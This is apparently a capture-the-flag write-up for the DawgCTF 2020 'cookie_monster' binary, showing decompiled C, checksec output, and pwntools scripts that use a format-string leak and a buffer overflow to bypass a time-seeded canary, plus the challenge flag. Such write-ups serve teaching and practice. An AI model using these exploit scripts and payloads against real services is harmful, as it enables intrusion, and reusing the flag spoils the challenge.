Main call `conversation()`:
```c
__int64 conversation()
{
  unsigned int v0; // eax
  int v1; // eax
  char v3; // [rsp+Fh] [rbp-11h]
  char s; // [rsp+14h] [rbp-Ch]
  int v5; // [rsp+1Ch] [rbp-4h]

  v0 = time(0LL);
  srand(v0);
  v1 = rand();
  v5 = v1;
  saved_cookie = v1;
  puts("\nOh hello there, what's your name?");
  fgets(&s, 8, _bss_start);
  printf("Hello, ", 8LL);
  printf(&s);
  puts("\nWould you like a cookie?");
  gets(&v3);
  return check_cookie(v5);
}
```

There is a format string vuln on first input and a buffer overflow on second input. 
We need to bypass cookie (canary) and jump into flag function.

Checksec:
```
[*] '/home/marco/Desktop/umbccd/cookie_monster/cookie_monster'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Since there is PIE we need to use the format string to leak the ret address (main+24) and use it to retrive flag function address.
The canary is a random number wich is bad generated. 
So the intended solution is to generate the same number executing the program in the same moment.
(code from https://github.com/toomanybananas/dawgctf-2020-writeups/blob/master/pwn/cookie_monster/cookie_sol.py):

```python
import ctypes

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

#srand on the current time to get same seed as server
LIBC.srand(LIBC.time(0))
cookie = p32(LIBC.rand())
```

MY solution:

I noticed the random number changes every second. So if we open 2 connections with 2 different programs we obtain the same number. 
We can use the first program to leak the canary, pass to the second program and use the second program to leak the address and get the flag.

Exploit:
```python
#!/usr/bin/python3.8
from pwn import *
import subprocess

r = remote('ctf.umbccd.io', 4200)
#r = process('./cookie_monster')

s = subprocess.Popen(['./leaker.py'], shell=True, stdout=subprocess.PIPE).stdout.read()
s = int(s.decode().split('\n')[3], 16)

print(r.recvuntil('?').decode())
r.sendline('%11$p')
print(r.recvuntil('Hello, ').decode())
mn = r.recv(16)
main24 = int(mn, 16)
flag = (main24-0x19a)

print('leaked cookie: ', hex(s))
print('leaked main+24: ', hex(main24), ' current flag address: ', hex(flag))


print(r.recvuntil('?\n').decode())

payload = (('A'*13).encode())
payload += p32(s)
payload += (('A'*8).encode())
payload += p64(flag)
r.sendline(payload)
print(r.recvall().decode())
#r.interactive()
```

leaker program:
```python
#!/usr/bin/python3.8
from pwn import *

p = remote('ctf.umbccd.io', 4200)
#p = process('./cookie_monster')

p.recvuntil('?')
p.sendline('%9$lx')
p.recvuntil('Hello, ')
cookie = int(p.recv(8), 16)
print(hex(cookie), "\n")
p.close()
```

# FLAG
`DawgCTF{oM_n0m_NOm_I_li3k_c0oOoki3s}`
